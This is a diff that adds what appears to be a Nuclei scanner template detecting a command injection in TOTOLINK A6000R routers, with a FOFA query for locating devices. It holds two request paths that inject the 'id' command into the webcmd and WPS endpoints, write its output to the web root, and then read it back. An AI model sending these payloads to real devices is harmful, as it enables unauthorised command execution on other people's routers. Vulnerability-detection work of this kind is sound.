@@ -1,0 +1,32 @@
+id: totolink-a6000r-command-injection
+
+info:
+  name: TOTOLINK A6000R 命令执行漏洞
+  author: Co5mos
+  severity: critical
+  description: |
+    TOTOLINK A6000R 存在命令执行漏洞，攻击者可以利用该漏洞在设备上执行任意命令。
+  metadata:
+    fofa-query: 'title="TOTOLINK"'
+  tags: totolink, rce
+
+http:
+  - raw:
+      - |
+        GET {{path}} HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /{{randstr}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    payloads:
+      path:
+        - /cgi-bin/luci/admin/mtk/webcmd?cmd=id%20/>/www/{{randstr}}.txt
+        - /cgi-bin/luci/admin/mtk/wifi/apcli_do_enr_pin_wps/;id>{{randstr}}.txt;/dev0/1
+
+    matchers:
+      - type: regex
+        part: body_2
+        regex:
+          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)"
